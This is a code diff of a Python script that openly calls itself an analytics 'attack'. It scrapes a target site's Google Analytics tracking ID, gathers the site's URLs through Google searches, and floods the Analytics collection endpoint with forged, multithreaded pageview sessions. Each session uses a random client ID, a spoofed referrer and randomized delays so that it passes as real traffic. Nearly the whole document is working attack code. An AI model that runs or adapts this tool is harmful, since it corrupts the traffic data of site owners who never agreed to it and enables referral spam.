@@ -4,38 +4,96 @@ import re
 import time
 import random
 import google
-import threading
+import logging
+from Queue import Queue
+from threading import Thread
 
 #https://developers.google.com/analytics/devguides/collection/protocol/v1/
 #https://developers.google.com/analytics/devguides/collection/protocol/v1/geoid
 
 def main():
+    logging.basicConfig(level=logging.DEBUG)
+    session = single_page_attack_session(target_url='http://zonksec.com', referral_url='http://lol.com', bounces=0, session_jitter=0,session_delay=0, end_with=True)
+    single_page_attack(session=session, number_of_sessions=5, threads=1,delay=5,jitter=.10)
 
-    test = single_page_attack(target_url='http://zonksec.com',referral_url='http://hacker.com',client_id=402,bounces=10,page_delay_jitter=.50,page_delay=30)
-    test.run()
 
-class single_page_attack:
-    def __init__(self, target_url, client_id, referral_url, bounce_urls = None, page_delay=30, page_delay_jitter=.10, bounces=0, loop=1):
+
+
+def single_page_attack(session, number_of_sessions, threads=1, delay=30, jitter=.50):
+    session_queue = Queue()
+    logging.info('[*] Queueing %s sessions.', str(number_of_sessions))
+    for _ in range(number_of_sessions):
+        session_queue.put("")
+    logging.info('[*] Starting %s threads.', str(threads))
+    for i in range(threads):
+        worker = Thread(target=thread_session, args=(i, session_queue, session,delay,jitter))
+        worker.setDaemon(True)
+        worker.start()
+    logging.info('[*] Waiting for threads.')
+    session_queue.join()
+    logging.info('[*] Single Page Attack Complete.')
+
+def thread_session(i,q,session,delay=0,jitter=0):
+    while True:
+        logging.debug('[+] Thread'+str(i)+': Starting a session')
+        q.get()
+        session.random_unique_cid()
+        output = session.run()
+        logging.info('[+] Thread' + str(i) + ': Session '+str(session.client_id)+' complete. Path: '+output)
+        #time_delay = delay - random.randint(0, (delay * jitter))
+        #time.sleep(time_delay)
+        q.task_done()
+
+
+class single_page_attack_session:
+    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.10, bounces=0, loop=1, end_with=True, tracking_id=None):
         self.target_url = target_url
-        self.client_id = client_id
         self.referral_url = referral_url
-        self.page_delay = page_delay
-        self.page_delay_jitter = page_delay_jitter
+        self.page_delay = session_delay
+        self.page_delay_jitter = session_jitter
         self.bounces = bounces
         self.bounce_urls = bounce_urls
         self.loop=loop
+        self.end_with = end_with
+        self.used_cids = []
+        self.client_id = self.random_unique_cid()
+        self.tracking_id = tracking_id
+
+        #end_with logic
+        if self.bounces == 0:
+            self.end_with = False
+
+        if self.tracking_id is None:
+            page = requests.get(target_url)
+            m = re.search("'(UA-(.*))',", page.text)
+            self.tracking_id = str(m.group(1))
 
         #if bounce urls are need, collects them.
         if self.bounces <= 10 and self.bounces != 0 and self.bounce_urls is None:
+            logging.info('[*] Bounce URLs are needed.')
             self.bounce_urls = []
-            search_results = google.search(query="site:"+self.target_url, num=10,stop=1)
+            search_results = list(google.search(query="site:"+self.target_url, num=10,stop=1))
+            logging.info('[+] Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
             for result in search_results:
                 self.bounce_urls.append(str(result))
         elif self.bounces > 10 and self.bounce_urls is None:
+            logging.info('[*] Bounce URLs are needed.')
             self.bounce_urls = []
-            search_results = google.search(query="site:"+self.target_url, num=self.bounces,stop=1)
+            search_results = list(google.search(query="site:"+self.target_url, num=self.bounces,stop=1))
+            logging.info('Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
             for result in search_results:
                 self.bounce_urls.append(str(result))
+
+    def random_unique_cid(self):
+        unique = False
+        while not unique:
+            cid = random.randint(10000, 99999)
+            if cid in self.used_cids:
+                unique = False
+            else:
+                unique = True
+                self.client_id = cid
+
 
     def run(self,client_id=None):
         if client_id is not None:
@@ -43,22 +101,31 @@ class single_page_attack:
         pages = []
         loop_count = 0
         last_page = self.referral_url
+        pages.append(last_page)
         while loop_count < self.loop:
-            target_request = analytics_request(document_location=self.target_url,document_referrer=last_page,client_id=self.client_id)
+            target_request = analytics_request(document_location=self.target_url,document_referrer=last_page,client_id=self.client_id,tracking_id=self.tracking_id)
             target_request.send()
             pages.append(self.target_url)
             bounce_count = 0
             last_page = self.target_url
             while (bounce_count < self.bounces):
                 delay = self.page_delay - random.randint(0,(self.page_delay * self.page_delay_jitter))
-                print(delay)
+                logging.debug('[*] Session sleep for %i seconds.', delay)
                 time.sleep(delay)
-                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,9)],document_referrer=last_page,client_id=self.client_id)
+                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,9)],document_referrer=last_page,client_id=self.client_id,tracking_id=self.tracking_id)
                 bounce_request.send()
                 pages.append(bounce_request.document_location)
                 last_page = bounce_request.document_location
                 bounce_count += 1
             loop_count += 1
+        if self.end_with:
+            delay = self.page_delay - random.randint(0, (self.page_delay * self.page_delay_jitter))
+            logging.debug('[*] Session sleep for %i seconds.', delay)
+            time.sleep(delay)
+            target_request = analytics_request(document_location=self.target_url, document_referrer=last_page, client_id=self.client_id,tracking_id=self.tracking_id)
+            target_request.send()
+            pages.append(self.target_url)
+
         behavior = ''
         for page in pages:
             behavior = behavior + page + ' => '
@@ -97,8 +164,7 @@ class analytics_request:
         params['ua'] = self.user_agent
 
         r = requests.post('https://www.google-analytics.com/collect', data=params)
-        print('request sent. param:')
-        print(params)
+        logging.debug('[*] Request Sent. ' + str(params))
 
 
 main()
